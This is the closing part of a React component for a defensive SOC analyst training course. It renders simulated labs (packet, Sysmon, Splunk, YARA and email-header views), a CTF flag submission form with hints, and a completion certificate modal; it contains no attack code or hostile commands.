                              <td style={{ padding: '8px 12px' }}>{pkt.no}</td>
                              <td style={{ padding: '8px 12px' }}>{pkt.time}</td>
                              <td style={{ padding: '8px 12px' }}>{pkt.src}</td>
                              <td style={{ padding: '8px 12px' }}>{pkt.dst}</td>
                              <td style={{ padding: '8px 12px', fontWeight: 'bold' }}>{pkt.proto}</td>
                              <td style={{ padding: '8px 12px' }}>{pkt.info}</td>
                            </tr>
                          ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              )}

              {/* LAB ENVIRONMENT 3: SYSMON PROCESS VIEWER (Module 3) */}
              {activeModule.lab.type === 'sysmon-event-sim' && (
                <div>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '14px', marginBottom: '20px' }}>
                    {activeModule.lab.events.map((ev, i) => (
                      <div key={i} style={{ background: '#030612', border: '1px solid var(--glass-border)', borderRadius: '6px', padding: '16px' }}>
                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px', borderBottom: '1px solid rgba(255,255,255,0.06)', paddingBottom: '6px' }}>
                          <span style={{ color: 'var(--accent-green)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem' }}>
                            EVENT ID {ev.eventId} ({ev.task})
                          </span>
                          <span style={{ fontSize: '0.75rem', color: 'var(--text-secondary)' }}>
                            {ev.computer} · {ev.time}
                          </span>
                        </div>
                        <pre style={{ margin: 0, fontSize: '0.82rem', fontFamily: 'var(--font-mono)', color: '#f1f5f9', whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
                          {ev.data}
                        </pre>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* LAB ENVIRONMENT 4: SPLUNK QUERY RUNNER (Module 4) */}
              {activeModule.lab.type === 'splunk-query-sim' && (
                <div>
                  <div style={{ marginBottom: '16px' }}>
                    <div style={{ display: 'flex', gap: '8px', marginBottom: '8px' }}>
                      <input
                        type="text"
                        value={splunkQuery}
                        onChange={(e) => setSplunkQuery(e.target.value)}
                        style={{
                          flex: 1,
                          padding: '10px 14px',
                          background: '#010309',
                          border: '1px solid var(--accent-cyan)',
                          borderRadius: '6px',
                          color: '#fff',
                          fontFamily: 'var(--font-mono)',
                          fontSize: '0.88rem',
                          outline: 'none'
                        }}
                      />
                      <button className="hack-btn" style={{ padding: '10px 20px' }}>
                        Run Query
                      </button>
                    </div>
                  </div>

                  <div style={{ overflowX: 'auto', background: '#020308', borderRadius: '6px', border: '1px solid var(--glass-border)' }}>
                    <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.85rem', fontFamily: 'var(--font-mono)' }}>
                      <thead>
                        <tr style={{ background: '#090e1a', color: 'var(--accent-cyan)', borderBottom: '1px solid var(--glass-border)' }}>
                          <th style={{ padding: '8px 12px', textAlign: 'left' }}>_time</th>
                          <th style={{ padding: '8px 12px', textAlign: 'left' }}>EventCode</th>
                          <th style={{ padding: '8px 12px', textAlign: 'left' }}>User</th>
                          <th style={{ padding: '8px 12px', textAlign: 'left' }}>Src_IP</th>
                          <th style={{ padding: '8px 12px', textAlign: 'left' }}>Status</th>
                        </tr>
                      </thead>
                      <tbody>
                        {activeModule.lab.dataset.map((row, rIdx) => (
                          <tr key={rIdx} style={{ borderBottom: '1px solid rgba(255,255,255,0.04)', color: row.eventCode === 4624 ? 'var(--accent-green)' : 'var(--text-secondary)' }}>
                            <td style={{ padding: '8px 12px' }}>{row._time}</td>
                            <td style={{ padding: '8px 12px', fontWeight: 'bold' }}>{row.eventCode}</td>
                            <td style={{ padding: '8px 12px' }}>{row.user}</td>
                            <td style={{ padding: '8px 12px' }}>{row.src_ip}</td>
                            <td style={{ padding: '8px 12px', fontWeight: 'bold' }}>{row.action}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              )}

              {/* LAB ENVIRONMENT 5: YARA VALIDATOR (Module 5) */}
              {activeModule.lab.type === 'yara-validator-sim' && (
                <div>
                  <h4 style={{ color: 'var(--accent-cyan)', fontSize: '0.9rem', marginBottom: '8px' }}>
                    EXTRACTED PROCESS MEMORY STRINGS:
                  </h4>
                  <div style={{ background: '#02040a', border: '1px solid var(--glass-border)', padding: '16px', borderRadius: '6px', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', color: '#e2e8f0', marginBottom: '20px' }}>
                    {activeModule.lab.memoryDumpStrings.map((str, idx) => (
                      <div key={idx} style={{ padding: '4px 0', borderBottom: '1px solid rgba(255,255,255,0.03)' }}>
                        <span style={{ color: 'var(--text-secondary)', marginRight: '16px' }}>[{idx.toString().padStart(2, '0')}]</span>
                        <span style={{ color: str.includes('\\pipe\\') ? 'var(--accent-red)' : 'inherit' }}>{str}</span>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* LAB ENVIRONMENT 6: EMAIL HEADER INSPECTOR (Module 6) */}
              {activeModule.lab.type === 'email-header-sim' && (
                <div>
                  <h4 style={{ color: 'var(--accent-cyan)', fontSize: '0.9rem', marginBottom: '8px' }}>
                    RAW RFC 5322 EMAIL HEADERS:
                  </h4>
                  <pre style={{ background: '#02040a', border: '1px solid var(--glass-border)', padding: '16px', borderRadius: '6px', fontFamily: 'var(--font-mono)', fontSize: '0.82rem', color: '#67e8f9', whiteSpace: 'pre-wrap', marginBottom: '20px' }}>
                    {activeModule.lab.rawHeaders}
                  </pre>
                </div>
              )}

              {/* Task Guide footer */}
              <div style={{ padding: '14px 18px', background: 'rgba(0, 255, 65, 0.05)', border: '1px solid var(--accent-green)', borderRadius: '6px', fontSize: '0.88rem' }}>
                <strong style={{ color: 'var(--accent-green)' }}>LAB INSTRUCTIONS:</strong>
                <pre style={{ margin: '6px 0 0 0', background: 'transparent', padding: 0, color: 'var(--text-primary)', fontFamily: 'var(--font-sans)', whiteSpace: 'pre-line' }}>
                  {activeModule.lab.taskInstructions}
                </pre>
              </div>
            </motion.div>
          )}

          {/* TAB 4: CTF CHALLENGE & FLAG SUBMISSION */}
          {activeTab === 'challenge' && (
            <motion.div
              key={`challenge-${activeModule.id}`}
              initial={{ opacity: 0, y: 15 }}
              animate={{ opacity: 1, y: 0 }}
              className="glass-panel"
              style={{ padding: '32px' }}
            >
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px', flexWrap: 'wrap', gap: '8px' }}>
                <h3 className="text-glow-green" style={{ margin: 0, display: 'flex', alignItems: 'center', gap: '10px' }}>
                  <Flag size={22} /> Module Challenge & Flag Submission
                </h3>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(0, 255, 65, 0.1)', border: '1px solid var(--accent-green)', color: 'var(--accent-green)', fontSize: '0.8rem', fontFamily: 'var(--font-mono)' }}>
                  REWARD: +{activeModule.challenge.points} XP
                </span>
              </div>

              <div style={{ padding: '18px 20px', background: 'rgba(0,0,0,0.5)', borderLeft: '3px solid var(--accent-cyan)', borderRadius: '6px', marginBottom: '24px' }}>
                <div style={{ color: 'var(--accent-cyan)', fontSize: '0.8rem', fontFamily: 'var(--font-mono)', marginBottom: '4px' }}>
                  QUESTION // OBJECTIVE:
                </div>
                <div style={{ fontSize: '1.05rem', color: '#fff', fontWeight: 'bold', lineHeight: '1.5' }}>
                  {activeModule.challenge.question}
                </div>
              </div>

              {/* Status Banner */}
              <AnimatePresence>
                {challengeStatus === 'success' && (
                  <motion.div
                    initial={{ scale: 0.95, opacity: 0 }}
                    animate={{ scale: 1, opacity: 1 }}
                    exit={{ opacity: 0 }}
                    style={{
                      padding: '16px 20px',
                      background: 'rgba(0, 255, 65, 0.15)',
                      border: '1px solid var(--accent-green)',
                      borderRadius: '8px',
                      color: 'var(--accent-green)',
                      marginBottom: '20px',
                      display: 'flex',
                      alignItems: 'center',
                      gap: '12px'
                    }}
                  >
                    <CheckCircle size={24} />
                    <div>
                      <strong style={{ fontSize: '1rem' }}>CHALLENGE SOLVED! (+100 XP)</strong>
                      <p style={{ margin: 0, fontSize: '0.85rem' }}>Your defense telemetry analysis is spot on. Progress saved!</p>
                    </div>
                  </motion.div>
                )}

                {challengeStatus === 'error' && (
                  <motion.div
                    initial={{ x: -10 }}
                    animate={{ x: [0, -10, 10, -10, 10, 0] }}
                    style={{
                      padding: '14px 18px',
                      background: 'rgba(255, 0, 60, 0.15)',
                      border: '1px solid var(--accent-red)',
                      borderRadius: '8px',
                      color: 'var(--accent-red)',
                      marginBottom: '20px',
                      display: 'flex',
                      alignItems: 'center',
                      gap: '10px'
                    }}
                  >
                    <AlertTriangle size={20} />
                    <span>INVALID FLAG OR ANSWER. Review the lab findings and try again!</span>
                  </motion.div>
                )}
              </AnimatePresence>

              {/* Flag Submission Form */}
              <form onSubmit={handleFlagSubmit} style={{ display: 'flex', gap: '12px', flexWrap: 'wrap', marginBottom: '24px' }}>
                <input
                  type="text"
                  placeholder="Enter flag format: flag{...} or target keyword"
                  value={flagInput}
                  onChange={(e) => setFlagInput(e.target.value)}
                  disabled={completedChallenges[activeModule.id]}
                  style={{
                    flex: 1,
                    minWidth: '280px',
                    padding: '12px 16px',
                    background: 'rgba(0,0,0,0.6)',
                    border: '1px solid var(--glass-border)',
                    borderRadius: '6px',
                    color: '#fff',
                    fontFamily: 'var(--font-mono)',
                    fontSize: '0.95rem',
                    outline: 'none'
                  }}
                />
                <button
                  type="submit"
                  disabled={completedChallenges[activeModule.id]}
                  className="hack-btn"
                  style={{
                    padding: '12px 24px',
                    display: 'flex',
                    alignItems: 'center',
                    gap: '8px',
                    background: completedChallenges[activeModule.id] ? 'rgba(0, 255, 65, 0.2)' : undefined,
                    borderColor: completedChallenges[activeModule.id] ? 'var(--accent-green)' : undefined
                  }}
                >
                  <Send size={16} />
                  {completedChallenges[activeModule.id] ? 'Solved' : 'Submit Flag'}
                </button>
              </form>

              {/* Progressive Hint Drawer */}
              <div style={{ borderTop: '1px solid var(--glass-border)', paddingTop: '20px' }}>
                <button
                  type="button"
                  onClick={() => setShowHint(!showHint)}
                  style={{
                    background: 'transparent',
                    border: 'none',
                    color: 'var(--accent-cyan)',
                    cursor: 'pointer',
                    display: 'flex',
                    alignItems: 'center',
                    gap: '6px',
                    fontFamily: 'var(--font-mono)',
                    fontSize: '0.85rem'
                  }}
                >
                  <HelpCircle size={16} /> {showHint ? 'Hide Hint' : 'Need a Hint?'}
                </button>

                {showHint && (
                  <motion.div
                    initial={{ opacity: 0, height: 0 }}
                    animate={{ opacity: 1, height: 'auto' }}
                    style={{
                      marginTop: '12px',
                      padding: '14px',
                      background: 'rgba(0, 229, 255, 0.05)',
                      border: '1px dashed var(--accent-cyan)',
                      borderRadius: '6px',
                      fontSize: '0.88rem',
                      color: 'var(--text-primary)'
                    }}
                  >
                    💡 <strong>HINT:</strong> {activeModule.challenge.hint}
                  </motion.div>
                )}
              </div>
            </motion.div>
          )}

        </div>
      </div>

      {/* 3. Certificate of Completion Modal */}
      <AnimatePresence>
        {showCertificate && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            style={{
              position: 'fixed',
              top: 0, left: 0, right: 0, bottom: 0,
              background: 'rgba(0,0,0,0.85)',
              backdropFilter: 'blur(8px)',
              display: 'flex',
              justifyContent: 'center',
              alignItems: 'center',
              zIndex: 10000,
              padding: '16px'
            }}
            onClick={() => setShowCertificate(false)}
          >
            <motion.div
              initial={{ scale: 0.85, y: 30 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.85, y: 30 }}
              onClick={(e) => e.stopPropagation()}
              className="glass-panel"
              style={{
                maxWidth: '700px',
                width: '100%',
                padding: '40px',
                border: '2px solid var(--accent-green)',
                boxShadow: '0 0 50px rgba(0, 255, 65, 0.3)',
                textAlign: 'center',
                position: 'relative'
              }}
            >
              <button
                onClick={() => setShowCertificate(false)}
                style={{ position: 'absolute', top: '16px', right: '16px', background: 'transparent', border: 'none', color: '#fff', fontSize: '24px', cursor: 'pointer' }}
              >
                &times;
              </button>

              <div style={{ display: 'inline-flex', padding: '16px', borderRadius: '50%', background: 'rgba(0, 255, 65, 0.1)', border: '2px solid var(--accent-green)', marginBottom: '16px' }}>
                <Award size={48} color="var(--accent-green)" />
              </div>

              <h2 className="text-glow-green" style={{ fontSize: '1.8rem', marginBottom: '8px' }}>
                CERTIFICATE OF COMPLETION
              </h2>
              <h4 style={{ color: 'var(--accent-cyan)', fontSize: '1rem', fontWeight: 'normal', marginBottom: '24px' }}>
                SOC Analyst & Blue Team Defense Pathway
              </h4>

              <p style={{ color: 'var(--text-secondary)', marginBottom: '8px' }}>This certifies that</p>
              
              <div style={{ margin: '0 auto 20px', maxWidth: '360px' }}>
                <input
                  type="text"
                  value={studentName}
                  onChange={(e) => setStudentName(e.target.value)}
                  placeholder="Enter your name"
                  style={{
                    width: '100%',
                    textAlign: 'center',
                    fontSize: '1.4rem',
                    fontFamily: 'var(--font-heading)',
                    background: 'transparent',
                    border: 'none',
                    borderBottom: '2px solid var(--accent-green)',
                    color: '#fff',
                    outline: 'none',
                    padding: '6px'
                  }}
                />
              </div>

              <p style={{ color: 'var(--text-primary)', maxWidth: '540px', margin: '0 auto 24px', lineHeight: '1.6', fontSize: '0.9rem' }}>
                Has demonstrated proficiency in Alert Triage, Network Traffic Deep Packet Inspection, Windows Sysmon Hunting, SIEM Detection Engineering, MITRE ATT&CK Mapping, and Incident Response Playbooks.
              </p>

              <div style={{ display: 'flex', justifyContent: 'space-around', borderTop: '1px solid var(--glass-border)', paddingTop: '20px', fontSize: '0.8rem', fontFamily: 'var(--font-mono)', color: 'var(--text-secondary)' }}>
                <div>
                  <span>INSTRUCTOR</span>
                  <div style={{ color: '#fff', fontWeight: 'bold' }}>Mohammed Moshii (CSA)</div>
                </div>
                <div>
                  <span>ISSUED BY</span>
                  <div style={{ color: 'var(--accent-green)', fontWeight: 'bold' }}>Moshii Cyber Defense Lab</div>
                </div>
                <div>
                  <span>CREDENTIAL ID</span>
                  <div style={{ color: 'var(--accent-cyan)' }}>SOC-{Math.floor(100000 + Math.random() * 900000)}</div>
                </div>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

    </div>
  );
};

export default SocCourse;
